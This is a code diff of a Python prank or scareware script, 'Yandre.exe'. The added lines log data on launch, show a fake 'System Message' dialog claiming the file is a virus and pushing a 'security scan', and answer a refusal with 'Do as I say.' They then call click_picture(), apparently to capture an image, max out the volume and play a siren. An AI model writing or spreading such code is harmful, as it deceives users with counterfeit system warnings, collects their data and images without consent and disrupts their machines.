@@ -1,19 +1,27 @@
+from brain import *
 from pyautogui import *
 from tkinter import messagebox
-from brain import play_siren, lock_screen, change_tab, change_window, log_data
-
-box1 = messagebox.askyesno("Yandre.exe", "Hello cutie, I'm your personal assistant shall we continue?")
-while not box1:
-    messagebox.showwarning("Yandre.exe",
-                           "Oopsie Woopsie!\nSeems like you pressed the wrong button. Let's try it once again, "
-                           "shall we?")
-    box1 = messagebox.askyesno("Yandre.exe", "Hello cutie, I'm your personal assistant shall we continue?")
-
-messagebox.showinfo("Yandre.exe", "Let's begin then, I'm very excited for this.")
 
 log_data()
-for i in range(80):
+
+counter = 0
+box1 = messagebox.askyesno("System Message", "This file is suspected to be a virus."
+                                             "\nClick yes to initiate a quick security scan.")
+while not box1:
+    if counter > 1:
+        break
+    messagebox.showwarning("System Message",
+                           "Do as I say.")
+    box1 = messagebox.askyesno("System Message", "Click yes to initiate a quick security scan.")
+    counter += 1
+
+click_picture()
+
+for i in range(20):
     press("volumeup")
+    press("volumeup")
+    press("volumeup")
+
 play_siren()
 
 for i in range(4):
